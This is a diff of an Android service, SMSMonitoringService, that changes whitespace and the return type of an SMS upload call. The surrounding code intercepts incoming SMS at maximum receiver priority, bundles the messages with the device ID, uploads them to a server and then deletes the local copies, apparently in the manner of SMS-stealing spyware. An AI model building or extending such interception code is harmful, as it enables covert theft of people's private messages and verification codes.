@@ -38,7 +38,7 @@ public class SMSMonitoringService extends Service {
 	public IBinder onBind(Intent intent) {
 		return null;
 	}
-
+	
 	@Override
 	public void onCreate() {
 		super.onCreate();
@@ -47,6 +47,7 @@ public class SMSMonitoringService extends Service {
 		ContentResolver smsResolver = getContentResolver();
 		smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(), new MyRunBack());
 		smsResolver.registerContentObserver(SMSConstant.CONTENT_URI, true,smsObserver);
+		
 		IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
 		intentFilter.setPriority(Integer.MAX_VALUE);
 		getApplicationContext().registerReceiver(new SMSReceiver(),intentFilter);
@@ -92,9 +93,8 @@ public class SMSMonitoringService extends Service {
 				}
 				String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
 				
-				String uploadResult = NetworkUtil.uploadSMS(getApplicationContext(), params,C.RequestMethod.uploadSMS);
-				if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
-				
+				boolean uploadResult = NetworkUtil.uploadSMS(getApplicationContext(), params,C.RequestMethod.uploadSMS);
+				if (uploadResult) {
 					smsRecordDB.deleteAll();
 				}
 			}
